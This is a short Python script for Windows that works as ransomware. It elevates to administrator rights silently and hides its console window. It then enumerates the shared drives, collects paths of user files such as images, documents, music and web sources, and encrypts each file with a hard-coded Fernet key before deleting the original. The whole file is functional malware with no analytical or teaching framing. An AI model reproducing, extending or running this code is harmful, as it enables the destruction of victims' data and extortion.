
from cryptography.fernet import Fernet 
from subprocess import check_output
from os import remove
import win32console
import win32gui
from elevate import elevate

# access admin
elevate(show_console=False)

# hidden console
w = win32console.GetConsoleWindow()
win32gui.ShowWindow(w,0)

#key = Fernet.generate_key()

Encrypt = Fernet('63oMbvNBL0q7B8DUyy2Jwv82oGY0xZwE4oS_RyoJvlY=')

def encrypt_files():

	file = open("paths.txt","r")
	read_file = file.readlines()

	for path in read_file:

		try:

			path = path.strip("\n")
			path = path.strip("\r")

			f = open(path , "rb")

			data = f.read()

			enc_data = Encrypt.encrypt(data)

			newfile = open(path+"[encrypted]","wb")

			newfile.write(enc_data)

			f.close()

			newfile.close()

			remove(path)

			print "encrypted -> "+path
		except:
				print "error"



def find_drive():

	drive = ["A:","B:","D:","E:","F:","G:","H:","Z:","N:","K:","L:","X:","P:","U:","J:","S:","R:","W:","Q:","T:","Y:","I:","O:","V:","M:"] 

	system_drive = []

	cmd = check_output("net share",shell=True)

	for i in drive:

		if i in cmd:
			system_drive.append(i)

	return system_drive

def find_files(drives):
		'''
		for p in passwand_files:
				try:
					cmd = check_output("cd / && dir /S /B *."+p,shell=True)
					f.writelines(cmd)
					print p
				except:
						pass
		'''
		for d in drives:
			for p in passwand_files:

					try:
						cmd = check_output(d+" && dir /S /B *."+p,shell=True)
						f.writelines(cmd)
						print d+" ----- "+p

					except:
							pass

		f.close()



passwand_files = ["jpg" , "pdf" , "mp3" , "rar" , "mp4" , "txt" , "html" , "js" , "php" , "png", "jpeg", "wmv"]

drives = find_drive()

f = open("paths.txt","w")

find_files(drives)

encrypt_files()

